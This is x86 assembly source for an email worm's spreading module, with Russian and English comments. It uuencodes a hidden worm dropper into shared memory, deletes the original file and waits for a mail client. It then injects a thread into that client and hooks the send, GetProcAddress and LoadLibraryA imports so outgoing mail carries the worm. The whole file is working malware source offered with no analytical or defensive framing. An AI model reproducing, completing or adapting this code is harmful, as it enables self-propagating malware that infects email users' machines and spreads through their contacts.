locals __
locals @@
__x	equ rec

mailspread 	proc
; no args

; locals
__ahand		equ ebx-4 ptr 8
__fsize		equ ebx-4 ptr 0Ch	
__hmapfile		equ ebx-4 ptr 10h	
__mapfile		equ ebx-4 ptr 14h	
__hmapuue		equ ebx-4 ptr 18h	
__mapuue		equ ebx-4 ptr 1Ch	
;__uuesize		equ ebx-4 ptr 20h	
__mhwnd		equ ebx-4 ptr 24h	
__mtid		equ ebx-4 ptr 28h	
__mpid		equ ebx-4 ptr 2Ch	

__localssize	equ 900h

	push ebx
	mov ebx, esp
	sub esp, __localssize

	; записываем файл в отображение и стираем его
	; write ___.___ to share memory and erase it
	push 0
	push FILE_ATTRIBUTE_HIDDEN
	push OPEN_EXISTING
	push 0
	push FILE_SHARE_READ+FILE_SHARE_WRITE
	push GENERIC_READ+GENERIC_WRITE
	lea eax, [tempdir]
	push eax
	xcall CreateFileA
	cmp eax, -1
	jz __mls_ret
	mov [__ahand], eax

	push 0 eax
	xcall GetFileSize
	mov [__fsize], eax
	
	sub esi, esi
	push esi
	or eax, 1
	push eax	; size of file
	push esi PAGE_READWRITE esi
	push [__ahand]
	xcall CreateFileMappingA
	mov [__hmapfile], eax
	mov ecx, [__fsize]
	or ecx, 1
	push ecx;esi
	push esi
	push esi FILE_MAP_ALL_ACCESS
	push eax
	xcall MapViewOfFile
	test eax, eax
	jz __mls_ret
	mov [__mapfile], eax

	; создаем буфер общего доступа для uue
	lea eax, [ebp+__mapuuename-__x]
	push eax
	mov eax, [__fsize]
	sal eax, 1
	push eax	; size of file * 2
	push esi PAGE_READWRITE esi
	push -1
	xcall CreateFileMappingA
	mov [__hmapuue], eax
	push esi
	push esi
	push esi FILE_MAP_ALL_ACCESS
	push eax
	xcall MapViewOfFile
	test eax, eax
	jz __mls_ret
	mov [__mapuue], eax

;int 3
	push [__mapuue]
	push [__fsize]
	push [__mapfile]
	xcall _uuencode@12
	mov 4 ptr [ebp+__uuesize-__x], eax	
	; все заебись, в __mapuue лежит закодированный червь-дроппер

	; закрываем файл и удаляем его
	push [__mapfile]
	xcall UnmapViewOfFile
	push [__hmapfile]
	xcall CloseHandle
	push [__ahand]
	xcall CloseHandle
	lea eax, [tempdir]
;nop
;int 3
	push eax
	xcall DeleteFileA

	mov 4 ptr [ebp+oldpid-__x], 0

;	nop 
;	int 3

__mailinject:	
	; wait for mail client
	xcall WaitForMailRun
	mov [__mhwnd], eax
	; результат - hwnd окна mailer-a
	push esp
	push esp
	push eax
	xcall GetWindowThreadProcessId
	
	sub esi, esi
	; TID в eax, PID в стеке
	pop ecx	
	cmp ecx, 4 ptr [ebp+oldpid-__x]
	jz __mailinject
	mov 4 ptr [ebp+oldpid-__x], ecx

	push eax	; tid
	push [__mhwnd]
	push virsize
	push (mailthread-virstart)
	lea edx, [ebp+virstart-__x]
	push edx
	push esi 	; virt addr = 0
	push ecx	; pid
	call efork

	push 10000	; ждем 10 с, пока почтовый клиент создаст мутекс
	xcall Sleep	; wait for mutex creation by mailclient

	lea eax, [ebp+__mmutname-__x]
	push eax
	push 1
	push 1f0001h	; MUTEX_ALL_ACCESS
	xcall OpenMutex
	mov [__hmutex], eax
	or eax, eax
	jz __mailinject	;__mls_ret

	
	push -1
	push [__hmutex]
	xcall WaitForSingleObject
	; мутекс освободился => процесс завершен
	; mutex free => process ended
	cmp eax, 80h
	jz __mailinject	; 
	; если мудекс достался нам, освобождаем его
	push [__hmutex]
	xcall ReleaseMutex
	jmp __mailinject	; 

		
__mls_ret:
	add esp, __localssize
	pop ebx
	ret

mailspread	endp

; поток, запускаемый в почтовом клиенте
; this thread runs in mailclient

	copy_to_stack mailthread, mailthread_stack_exec

; local variables
__hmutex 	equ ebp-4 ptr 08h
__hmodules	equ ebp-4 ptr 0Ch
__hm		equ ebp-4 ptr 10h
__mm		equ ebp-4 ptr 14h


mailthread_stack_exec:
	sub esp, __localssize

IF DEBUG EQ 1
	push 100
	push 500
	xcall Beep
ENDIF


    call loaddll2
	
	; грузим dll1 
	apiaddr GetProcAddress, __x
	push eax
	apiaddr LoadLibraryA, __x
	push eax
	apiaddr VirtualFree, __x
	push eax
	apiaddr VirtualProtect, __x
	push eax
	apiaddr VirtualAlloc, __x
	push eax
	lea eax, [ebp+dll1-__x]
	push eax
	call dllload
	add esp, 6*4
	or eax, eax
	jz __mls_ret
	mov 4 ptr [ebp+_Default-__x], eax
	
	push dll1_api_num
	pop ecx
__dll1 equ __uuencode@12-5
	lea esi, [ebp+__dll1-rec]
	push ebx
	call get_apis
	pop ebx

	;apiaddr _newWSAStartup@8, __x
	sub eax, eax
	push eax
	apiaddr _newsend@16, __x
	push eax
	xcall _setsendaddr@8

	; грузим winsock 2
	lea eax, [ebp+_ws2_32-rec]
	push eax
	xcall LoadLibraryA
	mov 4 ptr [ebp+ws2_addr-__x], eax
	or eax, eax
	jz __mtend
	mov 4 ptr [ebp+_Default-__x], eax

	push ws2_32_api_num
	pop ecx
__ws2_32 equ _send-5
	lea esi, [ebp+__ws2_32-rec]
	push ebx
	call get_apis
	pop ebx

	; создаем мутекс с правом владения
	; create mutex and own it
	lea eax, [ebp+__mmutname-__x]
	push eax	
	push 1
	push 0
	xcall CreateMutex
;	mov [__hmutex], eax
;	or eax, eax
;	jz __mtend

	; открываем отображение
	lea eax, [ebp+__mapuuename-__x]
	push eax 1 FILE_MAP_READ
	xcall OpenFileMappingA
	mov [__hm], eax
	
	push 4 ptr [ebp+__uuesize-__x]
	push 0 0 FILE_MAP_READ eax
	xcall MapViewOfFile
	mov [__mm], eax
	or eax, eax
	jz __mtend

	; передаем адрес uue буфера в DLL	
	push [__mm]
	xcall _setbufenc@4

	; устанавливаем новые адреса send и GetProcAddress 
	mov eax, 1000h
	call _valloc
	mov [__hmodules], eax
	xcall GetCurrentProcess
	push eax
	xcall GetCurrentProcessId
	push eax
	push [__hmodules]
	call findmodules

	; установка хуков
__set_hooks:	
	mov ecx, eax ; get number of obtained HMODULEs
	sar ecx, 2 ; divide by 4
	mov esi, [__hmodules]

__hook_loop:

	mov edx, 4 ptr [esi+ecx*4-4]

	; переставляем LoadLibraryA 
	lea eax, [ebp+LoadLibHook-__x]
	push eax
	apiaddr LoadLibraryA, __x
	push eax
	push edx	; модуль 
	call hook

	; для ws2 перехватываем только LoadLibrary 
	; NOTE: only LoadLibraryA hook in ws2_32.dll!
	cmp edx, 4 ptr [ebp+ws2_addr-__x]
	jz __nohook2

	; переставляем send
	apiaddr _newsend@16, __x
	push eax
	apiaddr send, __x
	push eax
	push edx	; модуль 
	call hook

	; переставляем GetProcAddress
	apiaddr _newGPA@8, __x
	push eax
	apiaddr GetProcAddress, __x
	push eax
	push edx	; модуль 
	call hook

__nohook2:

	loop __hook_loop

	push -1
	xcall Sleep	; усыпляем поток. прекращать его нельзя,
				; т.к. при этом очистится стек
__mtend:
	push 0
	xcall ExitThread

__mmutname 	db "mail thread running", 0
__mapuuename	db "uuemap", 0
__mwormmap		dd 0	
__uuesize		dd 0

; замена для LoadLibraryA 
; new LoadLibraryA
LoadLibHook:
__lib		equ ebx + 4 ptr 10h


	push edx ebx ebp
	mov ebx, esp

	call delta15
delta15:
	pop ebp
	sub ebp, (delta15-recalc)
	; грузим библиотеку
	push [__lib]
	xcall LoadLibraryA

	mov edx, eax

	; переставляем api в ней ; hook APIs in loaded DLL
	
	; переставляем LoadLibraryA
	lea eax, [ebp+LoadLibHook-__x]
	push eax
	apiaddr LoadLibraryA, __x
	push eax
	push edx	; модуль 
	call hook

	; для ws2 перехватываем только LoadLibrary 
	; NOTE: only LoadLibraryA hook in ws2_32.dll!
	cmp edx, 4 ptr [ebp+ws2_addr-__x]
	jz __nohook

	; переставляем send
	apiaddr _newsend@16, __x
	push eax
	apiaddr send, __x
	push eax
	push edx	; модуль 
	call hook

	; переставляем GetProcAddress
	apiaddr _newGPA@8, __x
	push eax
	apiaddr GetProcAddress, __x
	push eax
	push edx	; модуль 
	call hook

__nohook:

	mov eax, edx
	pop ebp ebx edx 
	ret 4

hook	proc
; arguments:
__mod		equ	ebx + 4 ptr 28h	;  	модуль, в котором надо переставить адреса
								; hmodule to hook
__oldapi	equ	ebx + 4 ptr 2Ch	;	адрес, подлежащий замене
								; old api addr
__newapi	equ 	ebx + 4 ptr 30h	; 	новый адрес
								; new api addr
; locals
__replaced	equ ebx-4 ptr 8h		; флаг 	; flag
__ib		equ ebx-4 ptr 0Ch	; imagebase

	pushad
	push ebx
	mov ebx, esp
	sub esp, 100h
	
	; находим pe-header
	; find pe-header
	mov eax, [__mod]
	or eax, eax
	jz __hfail
	cmp 2 ptr [eax], 'ZM'
	jnz __hfail
	
	mov ecx, [eax].mz_neptr
	cmp ecx, 2000h
	jg __hfail
	add eax, ecx
	
	cmp 2 ptr [eax], 'EP'
	jnz __hfail

	mov edi, eax
	; находим таблицу импортов в нем
	; find import table
	mov edx, [eax].pe_imagebase
	mov [__ib], edx
	mov esi, [edi].pe_importtablerva
;	add esi, edx	;  надо добавлять не имагебазе, а адрес модуля! иначе ошибка
	add esi, [__mod]
	
	mov [__replaced], 0
__replace_cycle:
	mov eax, [esi].im_addresstablerva
	add eax, [__mod]	; eax -> таблица адресов api 
__cy3:
	cmp 4 ptr [eax], 0
	jz __ecy3
	mov edx, 4 ptr [eax]
	cmp edx, [__oldapi]
	jnz __5467
;int 3
	mov edi, eax
	; изменяем защиту	; deprotect
	pushad
	push esp esp PAGE_READWRITE 4 edi
	xcall VirtualProtect
	or eax, eax
	pop eax
	popad
	jz __5467	; если разрешить чтение не удается, пропускаем 	
				; omit if cannot unprotect

	mov ecx, [__newapi]
	mov 4 ptr [edi], ecx	; замена адреса ; api addr replace
	mov [__replaced], 1
__5467:
	add eax, 4
	jmp __cy3
__ecy3:
	add esi, im_size
	cmp [esi].im_addresstablerva, 0
	jnz __replace_cycle

	cmp [__replaced], 0
	jz __hfail

__hok:
	sub eax, eax
	inc eax
	jmp __hend
__hfail:
	sub eax, eax
__hend:
	mov esp, ebx
	pop ebx
	popad
	ret 4*3
hook 	endp


ws2_addr	dd 0
oldpid	dd 0

dll1:
include dll1.inc
include dllload.inc
